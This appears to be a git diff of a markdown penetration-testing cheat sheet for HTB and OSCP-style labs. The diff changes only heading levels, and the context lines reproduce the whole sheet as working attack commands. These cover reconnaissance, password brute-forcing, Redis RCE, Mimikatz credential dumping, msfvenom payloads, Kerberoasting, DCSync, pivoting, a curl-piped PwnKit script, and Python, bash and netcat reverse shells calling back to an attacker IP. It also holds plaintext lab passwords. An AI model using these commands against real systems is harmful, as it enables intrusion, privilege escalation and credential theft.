@@ -4,41 +4,41 @@ draft: false
 showTableOfContents: true
 ---
 
-# 1. Enumeration
+## 1. Enumeration
 
-## Metadata
+### Metadata
 
-### exiftool
+#### exiftool
 
 ```bash
 exiftool file
 ```
 
-## Local Enumeration Scripts
+### Local Enumeration Scripts
 
-### Grabbing usernames
+#### Grabbing usernames
 
 ```bash
 grep sh$ /etc/passwd
 ```
 
-### Finding SUID binaries
+#### Finding SUID binaries
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 find / -user root -type f -perm -4000 -ls 2>/dev/null
 ```
 
-### Cewl
+#### Cewl
 
 ```markdown
 ??# cewl -d 5 <http://postfish.off/team.html> -w pop_passwords.txt
 
 ```
 
-## Cloud / AWS
+### Cloud / AWS
 
-### AWS → secret → s3
+#### AWS → secret → s3
 
 ```
 aws configure
@@ -59,23 +59,23 @@ Default output format [json]:
 └─$
 ```
 
-## Redis
+### Redis
 
 https://hackviser.com/tactics/pentesting/services/redis
 
-### metasploit
+#### metasploit
 
 ```jsx
 use auxiliary/scanner/redis/redis_server
 ```
 
-### Connecting
+#### Connecting
 
 ```jsx
 redis-cli -h target.com
 ```
 
-### Spawning webshell
+#### Spawning webshell
 
 ```jsx
 redis-cli -h ipaddr ping and in info server
@@ -103,7 +103,7 @@ redis-cli -h target.com
 > save
 ```
 
-### Redis RCE
+#### Redis RCE
 
 ```jsx
 RCE:https://github.com/Ridter/redis-rce
@@ -118,7 +118,7 @@ python redis-rce.py -r 192.168.220.176 -L 192.168.45.198 -P 6666 -p 6379 -f exp.
 
 ```
 
-## SSH
+### SSH
 
 usually located in the home directory of the user
 
@@ -126,7 +126,7 @@ usually located in the home directory of the user
 http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
 ```
 
-### Using a key
+#### Using a key
 
 ```
 nano id_rsa
@@ -137,7 +137,7 @@ ssh -i root root@127.0.0.1 -o IdentitiesOnly=yes
 
 ```
 
-### Cracking a key
+#### Cracking a key
 
 ```
 └─$ ssh2john id_ed25519
@@ -151,27 +151,27 @@ id_ed25519:$sshng$6$16$e641fd491743bdd48d8633fcb477d0cc$290$6f70656e7373682d6b65
 id_ed25519:$sshng$6$16$e641fd491743bdd48d8633fcb477d0cc$290$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010e641fd491743bdd48d8633fcb477d0cc0000001800000001000000330000000b7373682d65643235353139000000208016016aec442bd77315593f7e6b505d37fc52deed8f639302ab1985ad979866000000a0c64764ca8c76078c20a7c69b61eb4867f6d9e504f8aed73d6c6f476b7be93963a69947e0ad5e9eb1b7c0b13b1381635437e295c403584e107441db92d98bae664ac3e2eb57a8166147866593d2439f1c7a4f95b63bfca9f6f028f35e7dad040ba9eec3e8831dd9024f30b59db48861f8f1b3e08345d20489ae095b73baef4c1eba4203dd2b1c92c14c034e0478268654d884349fc0fa875de00f5ea7840a5953$24$130
 ```
 
-### Old SSH Algorithms
+#### Old SSH Algorithms
 
 ```bash
 ssh -oKexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa root@beep.htb
 ```
 
-## Nmap
+### Nmap
 
-### Going through nmap scripts
+#### Going through nmap scripts
 
 ```bash
 ls -al /usr/share/nmap/scripts/ | grep ftp-
 ```
 
-### Top UDP
+#### Top UDP
 
 ```bash
 nmap 10.129.18.188 -sU -top-ports=100 --min-rate=20000
 ```
 
-### Useful Switches
+#### Useful Switches
 
 - `sn` → Ping sweep
 - `sS` → TCP SYN
@@ -183,7 +183,7 @@ nmap 10.129.18.188 -sU -top-ports=100 --min-rate=20000
 - `T4` → Faster scan
 - `sC` → Default scripts
 
-### Port Knocking
+#### Port Knocking
 
 ```bash
 for i in 571 290 911; do
@@ -192,15 +192,15 @@ done
 ssh -i ~/keys/id_rsa_nineveh_amrois amrois@10.10.10.43
 ```
 
-### Filtered Ports
+#### Filtered Ports
 
 ```bash
 nmap -p- --min-rate 10000 <ip>
 ```
 
-## Web Enumeration
+### Web Enumeration
 
-### Interacting w API endpoint
+#### Interacting w API endpoint
 
 ```markdown
 curl -si http://192.168.200.117:50000/
@@ -210,7 +210,7 @@ curl -si http://192.168.200.117:50000/
 curl -si --data "email=test@doamin.com" http://192.168.200.117:50000/
 ```
 
-### Gobuster
+#### Gobuster
 
 ```bash
 gobuster dir -u <http://10.129.229.27/> -w /home/kali/Desktop/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -k if https
@@ -236,13 +236,13 @@ and then u can follow
 gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
 ```
 
-### Dirb
+#### Dirb
 
 ```bash
 dirb <http://192.168.1.224/> /usr/share/wordlists/dirb/common.txt
 ```
 
-### Feroxbuster
+#### Feroxbuster
 
 ```
 feroxbuster -u <http://10.10.11.220> -x php
@@ -252,13 +252,13 @@ feroxbuster -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,ht
 **I’ll use feroxbuster to brute force the API. I’ll use the -m GET,POST option to try both GET and POST requests, and -k to accept the invalid TLS certificate. I’m starting at /nagiosxi/api, and it finds v1 quickly (as well as includes):**
 ```
 
-### Sublist3r
+#### Sublist3r
 
 ```bash
 sublist3r -d website -e google,yahoo
 ```
 
-### Wfuzz
+#### Wfuzz
 
 ```
 wfuzz -u <http://10.129.18.188> -H "Host: FUZZ.pandora.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 1131
@@ -269,29 +269,29 @@ Parameter fuzzing
 wfuzz -u <https://streamio.htb/admin/?FUZZ=> -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=jtde06u71uq4t7pvs59b8iis1o" --hh 1678
 ```
 
-### Php filter
+#### Php filter
 
 ```
 <https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php:>
 echo "PGgxPDQo/Pg==" | base64 -d > master.php
 ```
 
-### Ffuf
+#### Ffuf
 
-### Username Enumeration
+#### Username Enumeration
 
 ```bash
 ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
 ```
 
-### Subdomain Enum
+#### Subdomain Enum
 
 ```bash
 ffuf -u <http://builder.htb/> -H "Host: FUZZ.trackbox.scipiosoft.com" -w /home/kali/Desktop/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
 ffuf -u "<http://builder.htb:8080>" -H "Host: FUZZ.builder.htb:8080" -w /home/kali/Desktop/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
 ```
 
-### Bruteforcing
+#### Bruteforcing
 
 ```bash
 ffuf -w valid_usernames.txt:W1 -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
@@ -301,15 +301,15 @@ ffuf -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-pa
 ffuf -w users.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u <http://10.129.1.27/login.php> -fc 200
 ```
 
-### Dirbusting
+#### Dirbusting
 
 ```bash
 ffuf -u <http://editorial.htb/FUZZ> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.txt,.bak,.old,.zip -fc 404 -k
 ```
 
-## Service Enumeration
+### Service Enumeration
 
-### SMB
+#### SMB
 
 ```
 smbclient -L \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\192.91.46.3\\\\\\\\\\\\\\\\ -U admin
@@ -332,7 +332,7 @@ nmap --script smb-enum-shares -p 139,445 [ip]
 smbclient -N "//$target/Replication"
 ```
 
-### CrackMapExec
+#### CrackMapExec
 
 ```
 crackmapexec smb support.htb
@@ -340,13 +340,13 @@ crackmapexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
 crackmapexec winrm 10.129.6.151 -u support -p 'Ironside47pleasure40Watchful' --> checks if winrm is allowed
 ```
 
-### OpenSSL
+#### OpenSSL
 
 ```bash
 openssl s_client -connect sequel.htb:3269
 ```
 
-### OpenSSL - Extracting the loot
+#### OpenSSL - Extracting the loot
 
 ```
 oxdf@hacky$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
@@ -360,7 +360,7 @@ oxdf@hacky$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_au
  $ evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
 ```
 
-### MSSQL
+#### MSSQL
 
 ```
 python mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
@@ -407,13 +407,13 @@ TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE
 hrappdb         dbo            sysauth      b'BASE TABLE'
 ```
 
-## Postgres
+### Postgres
 
 ```jsx
 psql -h 192.168.143.47 -p 5437 -U postgres
 ```
 
-### MYSQL
+#### MYSQL
 
 ```
 mysql -h 127.0.0.1 -P 3306 -u tiffany -p'BackDropJ2024DS2024'
@@ -423,7 +423,7 @@ updating password
 UPDATE planning_user SET password='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' WHERE user_id='ADM';
 ```
 
-### SNMP
+#### SNMP
 
 ```
 **snmp-check 10.10.10.10**
@@ -449,7 +449,7 @@ Target specific OIDS
 1.3.6.1.2.1.25.6.3.1.2 --> Softyware Name
 ```
 
-## SMTP
+### SMTP
 
 Verifying usernames
 
@@ -457,14 +457,14 @@ Verifying usernames
 smtp-user-enum -M VRFY -U users.txt -t 192.169.139.140
 ```
 
-### RPC-client
+#### RPC-client
 
 ```
 rpcclient -U "" -N 10.10.10.172
 querydispinfo
 ```
 
-### GitDump
+#### GitDump
 
 ```
 python3 -m venv venv
@@ -488,7 +488,7 @@ Inspect specific commits/files:
     grep -r "password" .: Use grep to search the repository files for keywords like "password", "API_key", "credentials", etc.
 ```
 
-### LDAP & ldapdomaindump
+#### LDAP & ldapdomaindump
 
 ```
 ldapsearch -x -H ldap://10.129.230.96 -b "dc=monitored,dc=htb"
@@ -511,7 +511,7 @@ check
 domain_users_by_group.html
 ```
 
-## http-proxy enumeration
+### http-proxy enumeration
 
 ```jsx
 #To scan itself on port 443
@@ -533,15 +533,15 @@ curl -i --proxy <http://192.168.113.189:3128> <http://192.168.113.189:8000>
 gobuster dir -u http://192.168.139.189:8080 -w /usr/share/wordlists/dirb/common.txt --proxy http://192.168.139.189:3128
 ```
 
-# 2. Credential Attacks
+## 2. Credential Attacks
 
-## NXC
+### NXC
 
 ```
 nxc ssh 10.10.11.58 -u users.txt -p 'BackDrop'
 ```
 
-## WPSCAN
+### WPSCAN
 
 ```
 wpscan --url <http://internal.thm/wordpress> -U userlist.txt --passwords /usr/share/wordlists/rockyou.txt
@@ -553,7 +553,7 @@ Theme editor
 
 ```
 
-## Burp
+### Burp
 
 ```
 After sending to intruder, add your payload positions
@@ -563,9 +563,9 @@ Choose Cluserbomb attack
 load rockyou
 ```
 
-## Hydra
+### Hydra
 
-### SSH
+#### SSH
 
 ```
 hydra -L users.txt  -P passwords.txt 192.168.122.122 ssh -t4 -vV
@@ -573,25 +573,25 @@ hydra -l jennifer -P /usr/share/wordlists/rockyou.txt builder.htb ssh
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://servmon.htb -t 4 -vV
 ```
 
-### PHPMyAdmin Example
+#### PHPMyAdmin Example
 
 ```bash
 hydra 10.10.10.43 -l 0xdf -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
 ```
 
-### Rails Example
+#### Rails Example
 
 ```bash
 hydra -l admin -P passwords.txt facts.htb http-post-form "/admin/login:authenticity_token=TOKEN&user[username]=^USER^&user[password]=^PASS^:F=Invalid"
 ```
 
-### Redirect Example
+#### Redirect Example
 
 ```bash
 hydra -l admin -P rockyou.txt facts.htb http-post-form "/admin/login:authenticity_token=TOKEN&user[username]=^USER^&user[password]=^PASS^:S=/admin"
 ```
 
-### FTP
+#### FTP
 
 ```bash
 hydra -L users.txt -P passwords.txt 192.x.x.x ftp
@@ -600,7 +600,7 @@ cat *
 
 ```
 
-### Normal Login Form
+#### Normal Login Form
 
 ```
 hydra -l info -P /usr/share/wordlists/rockyou.txt cozyhosting.htb http-post-form "/login:username=^USER^&password=^PASS^:F=error"
@@ -632,7 +632,7 @@ http-post-form "/ghost/api/admin/session:{\\\\"username\\\\":\\\\"^USER^\\\\",\\
 hydra -C userpass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
 ```
 
-## FFUF
+### FFUF
 
 ```
  ffuf -u <http://linkvortex.htb/ghost/api/admin/session> -X POST -H "Content-Type: application/json" -H "X-Ghost-Version: 5.58" -H "Origin: <http://linkvortex.htb>" -H "Referer: <http://linkvortex.htb/ghost/>" -d "{"username":"admin@linkvortex.htb","password":FUZZ}" -w /usr/share/wordlists/rockyou.txt -fr "Your password is incorrect"
@@ -663,7 +663,7 @@ curl -s -X POST http://192.168.126.29/login.php \
   -mc 200,302**
 ```
 
-## Medusa
+### Medusa
 
 ```jsx
 medusa -h 192.168.126.29 -u admin -P /usr/share/wordlists/rockyou.txt \
@@ -674,7 +674,7 @@ medusa -h 192.168.126.29 -u admin -P /usr/share/wordlists/rockyou.txt \
   -T 4
 ```
 
-## CrackMapExec
+### CrackMapExec
 
 ```bash
 crackmapexec winrm -u administrator -p tinkerbell -x "whoami"
@@ -683,14 +683,14 @@ credspray
 netexec smb $target -u 'userlist2.txt' -p 'creds.txt' --continue-on-success
 ```
 
-## John
+### John
 
 ```
 john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 specify --form=NT when cracking NT hashes
 ```
 
-## Hashcat
+### Hashcat
 
 ```
 hashcat -m 5600 hash.txt rockyou.txt
@@ -699,11 +699,11 @@ If you dont mention the mode then it goes in autodetect
 -m 7900 for msql drupal hashes
 ```
 
-# 3. Exploitation
+## 3. Exploitation
 
-## Windows PrivEsc Helpers
+### Windows PrivEsc Helpers
 
-### Wildcard Abuse
+#### Wildcard Abuse
 
 Create a rep with files that replicate command line args
 
@@ -717,7 +717,7 @@ and then
 sudo /usr/bin/borg extract /path/to/repo::archive ***
 ```
 
-### Certutil
+#### Certutil
 
 ```
 certutil -urlcache -split -f "<http://example.com/file.exe>" [LocalPath]
@@ -725,7 +725,7 @@ iwr http://192.168.45.159/winPEASany.exe -outfile winPEASany.exeb
 
 ```
 
-### PrintSpoofer - Standard Windows 2019
+#### PrintSpoofer - Standard Windows 2019
 
 ```
 PrintSpoofer32.exe -i -c cmd.exe or powershell.exe
@@ -734,14 +734,14 @@ Import-Module .\\\\\\\\Invoke-TokenManipulation.ps1
 Invoke-TokenManipulation -CreateProcess "cmd.exe" -ImpersonateUser "NT AUTHORITY\\\\\\\\SYSTEM"
 ```
 
-### WinExploitSuggester
+#### WinExploitSuggester
 
 ```bash
 python3 wes.py -u
 python3 wes.py sysinfo
 ```
 
-### Mimikatz
+#### Mimikatz
 
 ```
 Invoke-WebRequest <http://10.10.14.28:8081/mimikatz.exe> -OutFile C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\mimikatz.exe
@@ -757,7 +757,7 @@ lsadump::sam
 sekurlsa::logonpasswords
 ```
 
-### PowerUp.ps1
+#### PowerUp.ps1
 
 ```
 wget PowerUp.ps1 -o PowerUp.ps1
@@ -779,7 +779,7 @@ Invoke-AllChecks
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\\\\studentx' -Verbose
 ```
 
-### UAC Bypass
+#### UAC Bypass
 
 ```
 if we are part of the administrator group but have mandatory lervel medium
@@ -792,7 +792,7 @@ or
 powershell -C Get-Content -Path C:\\\\Windows\\\\System32\\\\eventvwr.exe | findstr /I "autoElevate"
 ```
 
-### PrintNightmare
+#### PrintNightmare
 
 ```
  Try this maybe it works sometimes
@@ -804,21 +804,21 @@ netexec smb $target -u 'admin' -p 'Password' --ntds
 impacket-psexec egostical-bank.local/administrator@target -hashes :8345adawdac
 ```
 
-### Add User to Local Admin
+#### Add User to Local Admin
 
 ```
 net localgroup "administrators" adiaz /add
 ```
 
-## Payloads / Generators
+### Payloads / Generators
 
-### pwnkit
+#### pwnkit
 
 ```jsx
 sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
 ```
 
-### msfvenom
+#### msfvenom
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp > shell.asp
@@ -826,7 +826,7 @@ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.54 LPORT=8220 -f exe -o revshell.exe
 ```
 
-### SQLMAP
+#### SQLMAP
 
 ```
 sqlmap -r req.txt --batch --level 3 --risk 2
@@ -860,7 +860,7 @@ sqlmap -u "<http://cctv.htb/view?request=event&action=removetag&tid=1>" -D <data
 --dump --threads 10 --batch
 ```
 
-### Filter Bypass Techniques
+#### Filter Bypass Techniques
 
 ```
 For white spaces we can use
@@ -869,9 +869,9 @@ or
 env variable, ${IFS} :- ping${IFS}-c${IFS}1
 ```
 
-# 4. Active Directory
+## 4. Active Directory
 
-## PowerView
+### PowerView
 
 ```jsx
 . .\Powerview.ps1
@@ -888,24 +888,24 @@ env variable, ${IFS} :- ping${IFS}-c${IFS}1
 | **Domain User Enumeration** | Get-DomainGroupMember -Identity "Domain Admins” | Gets us the members of the Domain Admin Group |
 | **Domain User Enumeration** | Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local | Lists out the Enterprise admins, root domain is specified in the query |
 
-## DNS / GMSA
+### DNS / GMSA
 
-### Adding A DNS Record
+#### Adding A DNS Record
 
 ```
 dnstool.py -u 'intelligence\\\\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.129.95.154 -a add -r web1 -d 10.10.14.137 -t
 ```
 
-### GMSA DUMP
+#### GMSA DUMP
 
 ```
 python gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l
 10.10.10.248
 ```
 
-## BloodHound
+### BloodHound
 
-### BloodHound Setup
+#### BloodHound Setup
 
 ```
 sudo apt install -y neo4j
@@ -914,7 +914,7 @@ sudo apt install -y bloodhound
 sudo /usr/share/neo4j/bin/neo4j-admin set-initial-password bloodhound
 ```
 
-### Collection with bloodyad
+#### Collection with bloodyad
 
 ```jsx
 bloodyAD -d secura.yzx -u Eric.Wallows -p 'EricLikesRunning800' --host dc01.secura.yzx --dc-ip 192.168.122.97 --dns 192.168.122.97
@@ -927,7 +927,7 @@ A good mental model:
 - `-dc-ip` → **DC IP if hostname resolution is flaky**
 - `-dns` → **DNS server to resolve AD names**
 
-### Collection
+#### Collection
 
 ```
 nxc ldap 192.168.122.97 -u Eric.Wallows -p 'EricLikesRunning800' -d secura.yzx --dns-server 192.168.122.97 --bloodhound --collection All
@@ -956,7 +956,7 @@ upload SharpHound.exe
 download <generated_zip_name>
 ```
 
-### DOCKER
+#### DOCKER
 
 ```jsx
 sudo apt update
@@ -1000,7 +1000,7 @@ snapshot DwPHaMBlANEZCf_A51q86xNHmwfXQKpN
 mxoY1hX8maH_MYwbxmHX39YVFQ9JU16N
 ```
 
-## Sharphound if needed
+### Sharphound if needed
 
 ```jsx
 cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
@@ -1014,19 +1014,19 @@ or with exe
 .\SharpHound.exe -c All --Domain secura.yzx --DomainController 192.168.122.97
 ```
 
-## Soaphound if ssl error & 9389 open
+### Soaphound if ssl error & 9389 open
 
 ```markdown
 soaphound -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -dc dc01.checkpoint.htb -dc-ip 10.129.2.121 -c Default --output-dir ./soaphound-out
 ```
 
-## Rubeus
+### Rubeus
 
 ```bash
 Rubeus.exe asktgt /user:administrator /certificate:C:\\\\\\\\programdata\\\\\\\\cert.pfx
 ```
 
-## Certify / Certipy-ad
+### Certify / Certipy-ad
 
 ```
 netexec ldap <DC_IP> -u user -p 'password' -M adcs
@@ -1066,7 +1066,7 @@ certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.10.10'
 
 get shell with psexec next
 
-## Responder
+### Responder
 
 ```bash
 sudo responder -I tun0
@@ -1077,7 +1077,7 @@ use slinky to capture hash
 
 ```
 
-## NTLMtheft
+### NTLMtheft
 
 ```jsx
 python3 ntlm_theft.py -g lnk -s 192.168.45.160 -f vault
@@ -1086,13 +1086,13 @@ impacket-smbserver test . -smb2support
 
 ```
 
-## Enum4linux
+### Enum4linux
 
 ```
 enum4linux -a $target
 ```
 
-## ASEP-ROASTING
+### ASEP-ROASTING
 
 ```
 impacket-GetNPUsers vulnnet-rst.local/ -dc-ip $target -usersfile usernames.txt -format john -outputfile hashes.txt
@@ -1108,7 +1108,7 @@ netexec ldap $target -u 'users2' -p '' -k --asreproast asrep.txt or --asrep hash
 john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt --format=krb5asrep
 ```
 
-## Kerberoasting
+### Kerberoasting
 
 ```
 impacket-GetUserSPNs -dc-ip $target 'vulnet-rst.local/t-skid:tj072889=' -request
@@ -1148,13 +1148,13 @@ or Rubeus
 
 ```
 
-## Kerbrute username eval
+### Kerbrute username eval
 
 ```
 /home/kali/Desktop/Boxes/Administrator/kerbrute userenum --dc 10.129.16.174 -d manager.htb users2.txt
 ```
 
-## Targeted Kerberoasting
+### Targeted Kerberoasting
 
 ```
 source venv/bin/activate
@@ -1167,13 +1167,13 @@ or
 **python targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb**
 ```
 
-## DNSrecon
+### DNSrecon
 
 ```
 dnsrecon -d 'EGOTISTICAL_BANK.LOCAL' -n $target
 ```
 
-## RID brute / Username Enum
+### RID brute / Username Enum
 
 ```
 git clone <https://github.com/mohinparamasivam/AD-Username-Generator>
@@ -1198,7 +1198,7 @@ netexec ldap $target -u '' -p '' --users |  '{print$ 5}' | fgrep -v '[*]' | tee 
 netexec smb blackfield.local -u 'guest' -p '' --rid-brute | grep "SidTypeUser" | awk -F'\\\\\\\\' '{print $2}' | awk '{print $1}' > users.txt
 ```
 
-## PSEXEC / WMIEEXEC / PASSTHEHASH
+### PSEXEC / WMIEEXEC / PASSTHEHASH
 
 ```
 rlwrap impacket-psexec vulnnet-rst.local/a-whitehat:bNdKVKjv@$target
@@ -1206,19 +1206,19 @@ rlwrap impacket-wmiexec vulnnet-rst.local/a-whitehat:bnafajfa@$target
 rlwrap impacket-psexec egostical-bank.local/administrator@target -hashes :8345adawdac
 ```
 
-## Secretsdump-DCSYNC
+### Secretsdump-DCSYNC
 
 ```
 impacket-secretsdump -just-dc-ntlm vulnnet-rst.local/whitehat:'akdfjakfaklf'@$target
 ```
 
-## Checking smb w Creds
+### Checking smb w Creds
 
 ```
 crackmapexec smb #target -u 'ADministrator' -H or -P
 ```
 
-## Checking smb Anon
+### Checking smb Anon
 
 ```
 netexec smb $target -u -p ‘’
@@ -1226,14 +1226,14 @@ reveals host
 crackmapexec smb support.htb --shares
 ```
 
-## WMI ANON
+### WMI ANON
 
 ```
 rpcclient -u "" -n $target
 enumdom users
 ```
 
-## Shadow Creds w Certipy —> GenericAll
+### Shadow Creds w Certipy —> GenericAll
 
 ```
 certipy-ad shadow auto -u krishna@ignite.local -p Password@1 -account management_svc
@@ -1257,7 +1257,7 @@ sudo apt remove certipy-ad
 pip install --break-system-packages certipy-ad==4.8.2
 ```
 
-## PGP
+### PGP
 
 ```
 gpg --decrypt credential.pgp
@@ -1267,21 +1267,21 @@ then gpg2john tryhackme.asc > hash.txt
 adn then john  it
 ```
 
-## Cadaver
+### Cadaver
 
 ```jsx
 cadaver http://192.168.45.159
 ```
 
-# 5. Access and Pivoting
+## 5. Access and Pivoting
 
-## Check Routing Table
+### Check Routing Table
 
 ```jsx
 route print
 ```
 
-## Switching Users
+### Switching Users
 
 Runas
 
@@ -1290,7 +1290,7 @@ Runas
 Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.45.177:443
 ```
 
-## Discovery
+### Discovery
 
 ```
 route
@@ -1310,15 +1310,15 @@ cat /proc/net/dev
 cat /proc/net/arp
 ```
 
-## Access
+### Access
 
-### sshuttle
+#### sshuttle
 
 ```bash
 sshuttle -r user@IP 10.129.4.0/24|
 ```
 
-### chisel
+#### chisel
 
 ```
 ./chisel server -p 8000 --reverse
@@ -1341,7 +1341,7 @@ change proxy to socks
 1080 localhost Socks5
 ```
 
-### Ligolo
+#### Ligolo
 
 **Ligolo portforwarding**
 
@@ -1490,7 +1490,7 @@ then on the victim
 .\chisel.exe client 10.10.10.102:8888 R:localhost:127.0.0.1:1433
 ```
 
-## If you want to revshell from inside
+### If you want to revshell from inside
 
 ```jsx
 listener_add -addr 0.0.0.0:80 --to 0.0.0.0:445
@@ -1500,7 +1500,7 @@ this will redirect the revshell that goes to the **pivot machine ( the one with 
 
 eg:- xp_cmdshell powershel -JABadafafafawffafw
 
-## JUUUST incase
+### JUUUST incase
 
 ```
 Kali       192.168.40.10
@@ -1510,7 +1510,7 @@ MS02       172.168.10.11
 
 Assume the Ligolo agent is running on **MS01**, and MS02 can reach MS01.
 
-### 1. Connect MS01's agent to Kali
+#### 1. Connect MS01's agent to Kali
 
 You already have this part:
 
@@ -1542,7 +1542,7 @@ Your normal Ligolo tunnel is now:
 Kali ←──────── Ligolo ──────── MS01
 ```
 
-### 2. Create the listener on MS01
+#### 2. Create the listener on MS01
 
 In the **Ligolo proxy**, while MS01 is the selected session:
 
@@ -1575,7 +1575,7 @@ AGENT LISTENER ADDRESS       PROXY REDIRECT ADDRESS
 0.0.0.0:4444                 127.0.0.1:4444
 ```
 
-### 3. Start your listener on Kali
+#### 3. Start your listener on Kali
 
 In another Kali terminal:
 
@@ -1589,7 +1589,7 @@ Now Kali is waiting at:
 127.0.0.1:4444
 ```
 
-### 4. The important part: what address MS02 connects to
+#### 4. The important part: what address MS02 connects to
 
 **Do not put `192.168.40.10:4444` in the MS02 payload for this particular setup.**
 
@@ -1630,7 +1630,7 @@ MS02 → 172.168.10.10:4444
 
 This is the crucial difference from your earlier idea of putting Kali's IP directly into the EXE.
 
-### 5. Test the listener before using your EXE
+#### 5. Test the listener before using your EXE
 
 From MS02, test whether MS01's listener is reachable:
 
@@ -1652,7 +1652,7 @@ MS01:4444 → Kali:127.0.0.1:4444
 
 and your Kali `nc` should receive the connection.
 
-### One subtle point
+#### One subtle point
 
 If **MS02 itself is running the Ligolo agent**, you don't need this listener arrangement merely to route Kali to MS02. The direct MS02 agent gives you a normal Ligolo session and lets Kali route into MS02's networks. The **listener is particularly useful when you need a connection initiated from a machine behind an existing agent/pivot to come back to Kali**. That's the "double pivot"/reverse connection use case documented by Ligolo-ng.
 
@@ -1676,9 +1676,9 @@ MS02 → MS01:4444 → Ligolo → Kali:4444
 
 rather than requiring MS02 to have direct network reachability to Kali.
 
-## Sensitive Store / Dumps
+### Sensitive Store / Dumps
 
-### SEBackupPrivilege
+#### SEBackupPrivilege
 
 ```
 On kali create a file called viper.dsh
@@ -1738,7 +1738,7 @@ and now finally dump it
 impacket-secretsdump -ntds ntds.dit -system system -sam sam local | tee dmp.txt
 ```
 
-### netexec - Hashdump - CREDS
+#### netexec - Hashdump - CREDS
 
 ```
 netexec smb $target -u 'admin' -p 'Password' -M nanodump --> to dump lsass
@@ -1757,7 +1757,7 @@ if ntlm hash then visit ntlm.pw
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=mscash2 mscash_hashes
 ```
 
-### Keepass
+#### Keepass
 
 ```
 keepass2john
@@ -1781,15 +1781,15 @@ kpcli --kdb CEH.kdbx
 show -f [num]
 ```
 
-# 6. Shells
+## 6. Shells
 
-## webshell aspx
+### webshell aspx
 
 ```jsx
 /usr/share/webshells/aspx/cmdasp.aspx
 ```
 
-## simple cron
+### simple cron
 
 ```bash
 #!/bin/bash
@@ -1802,13 +1802,13 @@ then sudo the command
 /tmp/bash -p
 ```
 
-### postgres revshell
+#### postgres revshell
 
 ```jsx
 https://github.com/squid22/PostgreSQL_RCE
 ```
 
-### Linux Upgrade
+#### Linux Upgrade
 
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -1839,32 +1839,32 @@ export TERM=xterm
 stty rows 40 columns 120
 ```
 
-### Base64
+#### Base64
 
 ```bash
 base64 -d password.txt
 ```
 
-### Python reverse shell
+#### Python reverse shell
 
 ```
 python -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR_HTB_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 ```
 
-### Bash reverse shell
+#### Bash reverse shell
 
 ```
 bash -c 'bash -i >& /dev/tcp/YOUR_HTB_IP/4444 0>&1'
 ```
 
-### NC reverse shell
+#### NC reverse shell
 
 ```
 nc YOUR_HTB_IP 4444 -e /bin/bash
 mkfifo /tmp/f; nc YOUR_HTB_IP 4444 < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f
 ```
